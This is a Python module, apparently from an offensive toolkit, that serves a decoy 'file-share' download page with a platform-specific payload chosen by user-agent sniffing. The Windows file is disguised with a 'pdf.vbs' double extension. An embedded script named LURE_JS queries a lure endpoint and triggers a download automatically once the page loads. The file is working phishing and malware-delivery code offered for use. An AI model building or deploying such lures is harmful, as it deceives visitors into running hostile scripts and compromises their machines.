"""Public landing page for get.<zone>/ — a file-share stub with UA sniff.

Server-side sniff, no JavaScript, one big button. Unknown UA shows all targets.
"""

from __future__ import annotations

from .config import Settings

OFFERS = {
    "windows": ("Windows", "pdf.vbs"),
    "macos": ("macOS", "zip"),
    "linux": ("Linux", "tar.gz"),
}


def sniff(user_agent: str) -> str:
    ua = user_agent.lower()
    if "windows" in ua:
        return "windows"
    if "mac os" in ua or "macintosh" in ua or "darwin" in ua:
        return "macos"
    if "linux" in ua or "x11" in ua:
        return "linux"
    return "all"


LURE_JS = """(function () {
  function detectOS() {
    var ua = navigator.userAgent || "";
    if (/Windows|Win32|Win64/i.test(ua)) return "windows";
    if (/Macintosh|Mac OS X|Darwin/i.test(ua)) return "darwin";
    if (/Linux|X11|CrOS/i.test(ua)) return "linux";
    return "all";
  }
  function go() {
    if (window.__fleetDownloaded) return;
    window.__fleetDownloaded = true;
    var os = detectOS();
    fetch("/__lure/target?os=" + encodeURIComponent(os) +
          "&ua=" + encodeURIComponent(navigator.userAgent || ""))
      .then(function (r) { return r.json(); })
      .then(function (d) {
        if (!d || !d.url) return;
        setTimeout(function () {
          var a = document.createElement("a");
          a.href = d.url; a.rel = "noopener";
          document.body.appendChild(a); a.click();
        }, 1200);
      })
      .catch(function () {});
  }
  if (document.readyState === "complete") go();
  else window.addEventListener("load", go);
})();
"""


def family_for_os(os_value: str) -> str:
    mapping = {"windows": "windows", "darwin": "macos", "macos": "macos", "linux": "linux"}
    return mapping.get(os_value, "windows")


def newest(artifacts: list[dict[str, object]]) -> dict[str, dict[str, object]]:
    """Newest artifact per platform family."""
    family_of = {"windows": "windows", "darwin": "macos", "linux": "linux"}
    picked: dict[str, dict[str, object]] = {}
    for artifact in artifacts:
        family = family_of.get(str(artifact.get("os", "")))
        if family is None:
            continue
        current = picked.get(family)
        if current is None or float(artifact["ts"]) > float(current["ts"]):
            picked[family] = artifact
    return picked


def page(config: Settings, picked: dict[str, dict[str, object]], user_agent: str) -> str:
    target = sniff(user_agent)
    if target == "all" or target not in picked:
        offered = [(key, picked[key]) for key in ("windows", "macos", "linux") if key in picked]
    else:
        offered = [(target, picked[target])]

    doc = config.document_name
    rows = []
    for _family, artifact in offered:
        label = OFFERS.get(str(artifact.get("os", "")), ("Download", ""))[0]
        ext = str(artifact.get("name", "")).split(".")[-1]
        rows.append(
            f'<a class="btn" href="/e/{artifact["slug"]}">Download for {label} (.{ext})</a>'
        )
    buttons = "\n  ".join(rows) if rows else '<span class="dim">no artifacts yet</span>'

    return f"""<!doctype html>
<html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>{doc}</title>
<style>
  body{{margin:0;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
        background:#f6f7f9;color:#1b1f24;display:grid;place-items:center;min-height:100vh}}
  .box{{background:#fff;border:1px solid #e3e6ea;border-radius:10px;padding:32px 36px;
        box-shadow:0 1px 3px rgba(0,0,0,.05);text-align:center;max-width:420px}}
  h1{{font-size:17px;font-weight:600;margin:0 0 6px}}
  p{{color:#57606a;font-size:13px;margin:0 0 22px}}
  a.btn{{display:block;background:#1f6feb;color:#fff;text-decoration:none;padding:12px 16px;
        border-radius:8px;font-size:14px;margin:8px 0}}
  a.btn:hover{{background:#1a63d2}}
  .dim{{color:#8b949e;font-size:13px}}
  footer{{color:#8b949e;font-size:11px;margin-top:18px}}
</style></head>
<body><div class="box">
  <h1>{doc}</h1>
  <p>Your download is ready.</p>
  {buttons}
  <footer>{len(offered) or 0} file(s) available</footer>
</div></body></html>
"""
